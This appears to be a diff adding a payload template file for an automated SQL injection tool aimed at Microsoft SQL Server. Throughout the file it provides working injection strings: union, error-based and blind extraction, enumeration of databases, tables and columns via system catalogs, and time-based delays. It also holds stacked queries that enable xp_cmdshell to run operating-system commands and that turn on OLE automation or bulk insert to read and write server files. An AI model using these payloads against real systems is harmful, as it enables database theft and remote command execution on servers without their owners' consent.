@@ -1,0 +1,47 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols}
+UnionData:1=2 union all select {cols} from [{db}]..[{table}] where 1=(select top 1 1 from (select top {rowIndex} * from [{db}]..[{table}]{where} order by 1) t order by 1 desc)
+UnionDataRows:1=2 union all select {fill} from (select stuff((select ''+cast(sqli_r as nvarchar(max)) from (select {cols} sqli_r,row_number() over(order by (select 0)) sqli_rn from [{db}]..[{table}]{where}) sqli_t where sqli_rn>{rowIndex} and sqli_rn<={rowIndex}+{batchSize} order by sqli_rn for xml path(''),type).value('.','nvarchar(max)'),1,0,'') sqli_agg) sqli_x
+ErrorData:convert(int,(char(94)+char(94)+char(33)+cast({cols} as varchar(2000))+char(33)+char(94)+char(94)))=1
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:(select count(1) from [master]..[sysdatabases])
+TableCount:(select count(1) from [{db}]..[sysobjects] where xtype=0x55)
+ColumnCount:(select count(1) from [{db}]..[syscolumns] where id=object_id('{db}..{table}'))
+DBName:(select (select top 1 name from (select top {index} name from [master]..[sysdatabases] order by name) t order by t.name desc))
+DBNames:(select stuff((select ','+name from [master]..[sysdatabases] for xml path('')),1,1,''))
+TableName:(select (select top 1 name from (select top {index} name from [{db}]..[sysobjects] where xtype=0x55 order by name) t order by t.name desc))
+TableNames:(select stuff((select ','+name from [{db}]..[sysobjects] where xtype=0x55 for xml path('')),1,1,''))
+ColumnName:(select (select top 1 name from (select top {index} name,colid from [{db}]..[syscolumns] where id=object_id('{db}..{table}') order by colid) t order by t.colid desc))
+ColumnNames:(select stuff((select ','+name from [{db}]..[syscolumns] where id=object_id('{db}..{table}') order by colid for xml path('')),1,1,''))
+Substr:substring(({expr}),{start},{len})
+Concat:{startMark}+{split}+{cols}+{split}+{endMark}
+Length:len({expr})
+Cast:cast({expr} as varchar(8000))
+IfNull:isnull({expr},char(32))
+Ascii:ascii({expr})
+Hex:master.dbo.fn_varbintohexstr(cast({expr} as varbinary))
+DataValue:(select top 1 {cols} from (select top {rowIndex} * from [{db}]..[{table}]{where} order by 1) t order by 1 desc)
+DataCount:(select count(1) from [{db}]..[{table}]{where})
+SleepBoolData: 1=1;if({cond}) waitfor delay '0:0:{sleep}'
+ErrorChunkLen:80
+BlindStrategy: unicode
+DnsChannel: yes
+CmdExec: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection(id int primary key identity,data varchar(8000));declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 
+CmdData:cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))
+CmdDataCount:(select (select count(1) from ssqlinjection))
+CmdDropTable: 1=1;drop table ssqlinjection;select 1 where 1=1 
+FileWriteFso: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data={data};declare @path varchar(4000);set @path={path};exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;select 1 where 1=1 
+FileWriteWebTask: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'web assistant procedures',1;reconfigure;declare @d varchar(8000);set @d={data};declare @p varchar(4000);set @p={path};exec sp_makewebtask @p, @d;select 1 where 1=1 
+FileWriteBackup: 1=1;insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 
+FileBackupCreateDb: 1=1;create database ssqlinjection;select 1 where 1=1 
+FileBackupCreateTable: 1=1;create table [ssqlinjection]..[data] (content image);select 1 where 1=1 
+FileBackupDrop: 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 
+FileReadFso: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 
+FileReadBulk: 1=1;if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (data varchar(8000));bulk insert ssqlinjection from '{path}';select 1 where 1=1 
+FileContent:(select (select cast(data as varchar(max))+char(13)+char(10) from ssqlinjection for xml path(''),type).value('.','varchar(max)'))
+NocastUnicodeValue:unicode(substring({data},{index},1))
